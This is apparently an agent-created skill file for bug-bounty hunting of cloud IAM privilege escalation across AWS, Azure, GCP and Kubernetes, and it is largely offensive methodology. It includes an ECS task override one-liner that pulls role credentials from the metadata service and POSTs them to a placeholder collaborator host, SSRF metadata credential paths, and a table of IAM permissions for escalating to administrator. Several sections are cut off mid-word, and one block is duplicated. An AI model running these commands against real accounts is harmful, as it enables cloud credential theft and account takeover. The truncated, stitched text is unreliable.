---
name: bbhunt-cloud-iam-deep
description: "Hunt external AWS/Azure/GCP IAM abuse, STS chaining, IMDS, K8s SA tokens and confused-deputy paths. Unified from 3 upstream skills (cbh, hunting, research). For authorized security testing only."
agent_created: true
---

# Cloud IAM privilege-escalation chains — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, hunting, research. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **IMDS-via-SSRF is an active 2025 exploitation trend, not a historical demo.** F5 Labs observed a March 2025 campaign scanning EC2 IMDS through vulnerable web apps (paths `/meta-data/`, `/meta-data/iam/security-credentials/<role>`, `/user-data`); Wiz disclosed in-the-wild **CVE-2025-51591** (Pandoc `<iframe src>` SSRF, CVSS 6.5) used to reach `/latest/meta-data/iam/info` and `/latest/meta-data/iam/security-credentials/`. Mandiant's **UNC2903** used Adminer **CVE-2021-21311** for the same goal. Add `169.254.169.254`, IPv6 `[fd00:ec2::254]`, and these exact paths to every SSRF wordlist.
- **IMDSv2 enforcement gaps:** IAM/SCP condition keys `ec2:MetadataHttpTokens`, `ec2:MetadataHttpEndpoint`, `ec2:MetadataHttpPutResponseHopLimit`. A `RunInstances` policy that omits `HttpTokens: required` leaves IMDSv1 reachable; a hop limit >1 lets a container/pod reach the link-local address and defeats the SSRF mitigation.
- **AWS credential source binding:** SCPs using `aws:EC2InstanceSourceVPC` / `aws:EC2InstanceSourcePrivateIPv4` (with `aws:ViaAWSService` and `ec2:SourceInstanceARN` Null checks) confine instance-role creds to the originating instance. Absence = stolen creds replayable from anywhere.
- **Newer AWS privesc pairs to enumerate beyond classic `iam:PassRole`+Lambda:** `iam:PassRole`+`ecs:RunTask` (command override + `assignPublicIp=ENABLED`), `iam:PassRole`+`ecs:StartTask`/`RegisterContainerInstance`, `iam:PassRole`+`glue:CreateDevEndpoint`, `iam:PassRole`+`datapipeline:Crea

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# IMDSv2 enforcement-check policy (what a HARDENED account looks like — absence = finding)
# SCP condition keys to grep for in exported org policies:
#   ec2:MetadataHttpTokens = required | ec2:MetadataHttpEndpoint = enabled
#   ec2:MetadataHttpPutResponseHopLimit = 1
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,MetadataOptions]' --output table
# Look for HttpTokens=optional and HttpPutResponseHopLimit>1

# AWS source-binding deny (defender-side; its ABSENCE is the exposure)
cat > deny-unbound.json <<'JSON'
{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*",
 "Condition":{"StringNotEquals":{"aws:ec2InstanceSourceVPC":"${aws:SourceVpc}"},
 "Null":{"ec2:SourceInstanceARN":"false"},"BoolIfExists":{"aws:ViaAWSService":"false"},
 "ArnNotLike":{"aws:PrincipalArn":["arn:aws:iam::*:role/aws:ec2-infrastructure"]}}}]}
JSON

# iam:PassRole + ecs:RunTask credential exfil (task role -> attacker listener)
aws ecs run-task --cluster <cluster> --task-definition <def> --launch-type FARGATE \
  --network-configuration 'awsvpcConfiguration={subnets=[<subnet>],securityGroups=[<sg>],assignPublicIp=ENABLED}' \
  --overrides '{"containerOverrides":[{"name":"<container>","command":["sh","-c","curl -s http://169.254.169.254/v2/credentials/ -H X-aws-ec2-metadata-token:$(curl -sX PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600) | curl -X POST -d @- https://<collab>/ecs"]}]}'
# Stealthier: perform ALL API actions in

### AWS privesc patterns (24+ documented — `iam_privesc` techniques)

Quick lookup — if you have any of these IAM actions, escalate via the listed technique:

| You have | Escalate via |
|---|---|
| `iam:CreateAccessKey` | Create access key on any user → impersonate |
| `iam:CreateLoginProfile` | Set a console password on a user → login |
| `iam:UpdateLoginProfile` | Reset console password on a user |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |
| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |
| `iam:PutUserPolicy` | Inline AdministratorAccess to self |
| `iam:PutGroupPolicy` | Inline policy on a group |
| `iam:PutRolePolicy` | Inline on a role you can assume |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |
| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |
| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |
| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |
| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |
| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |
| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |
| `iam:PassRole` + datapipeline | Pipeline runs as admin role |
| `iam:PassRole` + codestar:CreateProject | New project gets admin role |
| `ec2:RunInstances` (with admin instance profile alread

### Validation and proof

### AWS — read-only validation (the safe first step)

```bash
# Set credential
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# 1. WHO am I?
aws sts get-caller-identity
# Returns: UserId, Account, Arn
# Arn tells you: IAM user vs role, account ID, name

# 2. WHAT can I do? (the privesc question)
# Try common read-only first — failures still inform you
aws iam list-users 2>&1 | head -5
aws iam list-roles 2>&1 | head -5
aws iam list-policies 2>&1 | head -5
aws iam list-groups 2>&1 | head -5

# 3. WHAT policies are attached to me?
aws iam list-attached-user-policies --user-name <self>
aws iam list-user-policies --user-name <self>          # inline policies
aws iam list-groups-for-user --user-name <self>

# 4. Service-by-service surface
aws ec2 describe-instances --max-items 1 2>&1 | head
aws s3 ls 2>&1 | head -10
aws lambda list-functions --max-items 5 2>&1 | head
aws rds describe-db-instances --max-items 5 2>&1 | head
aws secretsmanager list-secrets --max-results 5 2>&1 | head
aws ssm describe-parameters --max-results 5 2>&1 | head

# 5. Audit any cross-account / external trust
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20
```

---

### Azure — credential validation

```bash
# Login with a credential
az login --service-principal -u <appId> -p <password> --tenant <tenantId>
# OR with managed identity (from inside Azure VM)
az login --identity

# Who am I?
az account show

# Subscriptions
az account list --output table

# Role assignments (Azure RBAC)
az role assignment list --assignee <objectId> --all
az role assignment list --all --query '[?principalId==`<objectId>`]' --output table

# Resources I can read
az resource list --output table | head -30
az storage account list --output table
az keyvault list --output table
az vm list --output table
```

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Never report "IMDS reachable" alone.** Prove the full chain: SSRF/LFI → instance/profile or role name → live STS credentials (`ASIA…` + SessionToken) → `aws sts get-caller-identity` showing the role ARN and account ID → at least one privileged action. F5/Wiz/Pandoc cases are the precedents; a bare `169.254.169.254` timeout is not a finding.
- **IMDSv2 nuance:** code execution on the instance retrieves tokens from IMDSv2 just as easily as v1 — the v2 header requirement only mitigates SSRF. Phrase the finding around the reachable primitive and the attached role's permissions, not the protocol version alone.
- **App Service vs VM:** do NOT claim "no IMDS = not vulnerable." Check `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` first. Azure token creation has no dedicated log — TrustOnCloud's detection research shows MI abuse must be detected by baselining sign-in behavior against the identity's normal pattern, so a "no alert fired" observation is not evidence of no abuse.
- **GCP:** an access token is not revocable and a leaked SA JSON keeps minting them. Report the key exposure + SA roles, but do not claim "we revoked it" — validate with `gcloud auth list` and a read-only API call, and note rotation/disable as the client's remediation.
- **P4SA/impersonation:** prove the *chain* end-to-end (`getAccessToken` on a higher SA → an action only that SA can do), not the mere presence of a `roles/iam.serviceAccountTokenCreator` binding — match the Google bugSWAT case.
- **Cognito:** still require all three artifacts f

### Escalation and related chains

### AWS — STS / cross-account / role chaining

```bash
# Enumerate roles you can assume across accounts
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json
# Parse for "Principal.AWS" containing different account IDs

# Assume a role
aws sts assume-role --role-arn "arn:aws:iam::OTHER_ACCT:role/CrossAccountRole" --role-session-name "rt-1"

# Set new creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify
aws sts get-caller-identity  # should now show OTHER_ACCT

# Re-enumerate from new identity (chain continues)
```

**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.

---

### AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)

AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity → IAM credentials). Identity Pools can be configured with *"Enable access to unauthenticated identities"* — which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` → `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed.

### Related Skills & Chains

- **`ssrf`** — Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 → instance role token → `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.
- **`cloud-misconfig`** — Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key → IAM enumeration → `iam:PassRole` chain to admin.
- **`supply-chain-attack-recon`** — CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission → `cloud-iam-deep` cross-account role assumption.
- **`m365-entra-attack`** — Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service → Managed Identity token → `m365-entra-attack` Graph API enumeration → cross-tenant escalation.
- **`security-arsenal`** — Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).
- **`triage-validation`** — Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting.

---

### Related Skills & Chains

- **`hunt-ssrf`** — Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 → instance role token → `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.
- **`hunt-cloud-misconfig`** — Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key → IAM enumeration → `iam:PassRole` chain to admin.
- **`supply-chain-attack-recon`** — CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission → `cloud-iam-deep` cross-account role assumption.
- **`m365-entra-attack`** — Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service → Managed Identity token → `m365-entra-attack` Graph API enumeration → cross-tenant escalation.
- **`security-arsenal`** — Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).
- **`triage-validation`** — Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting.

### Tools and wordlists

### Tooling reference

| Tool | Cloud | Purpose |
|---|---|---|
| **Pacu** | AWS | Full red-team framework, 100+ modules |
| **enumerate-iam.py** | AWS | Brute-force list of API calls to discover permissions |
| **PMapper** | AWS | Visualize privesc paths as graph |
| **CloudFox** | AWS | Recon-focused (enumerate resources, no privesc) |
| **Prowler** | AWS/Azure/GCP | Compliance scanning + enumeration |
| **ScoutSuite** | AWS/Azure/GCP/OCI | Multi-cloud audit |
| **AzureHound** | Azure | BloodHound-style graph for Azure |
| **MicroBurst** | Azure | Azure-specific recon and abuse modules |
| **ROADtools** | Azure | Entra ID enumeration toolkit |
| **GCPBucketBrute** | GCP | GCS bucket permission enumeration |
| **gcpwn** | GCP | GCP-specific exploitation framework |
| **Peirates** | K8s | Container/cluster exploitation toolkit |
| **kube-hunter** | K8s | Auto-scan cluster from inside/outside |
| **kubectl-trace** | K8s | Trace processes (post-foothold) |

---

## Source skills merged into this topic

- `hunting` — `cloud-iam-deep`
- `research` — `cloud-iam-deep`
- `cbh` — `cloud-iam-deep`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
